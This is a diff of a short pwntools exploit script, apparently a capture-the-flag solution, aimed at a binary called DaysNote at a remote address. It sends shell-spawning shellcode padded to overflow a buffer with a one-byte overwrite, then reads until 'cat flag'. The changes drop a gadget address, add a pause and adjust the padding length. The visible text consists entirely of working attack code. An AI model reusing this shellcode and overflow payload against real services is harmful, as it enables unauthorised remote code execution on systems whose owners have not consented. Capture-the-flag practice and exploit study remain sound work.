@@ -6,11 +6,9 @@ shellcode = "\x31\xc0\x31\xd2\xb0\x0f\x2c\x04\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2
 s = remote('110.10.147.38', 8888)
 e = ELF('./DaysNote')
 
-ppppr = 0x080487b8
-
 s.sendline('2016')
-
-s.sendline('A'*4 + shellcode + 'A'*(361-len(shellcode)) + '\x30')
+pause()
+s.sendline(shellcode + 'A'*(365-len(shellcode)) + '\x30')
 
 print s.recvuntil('cat flag\n')
 
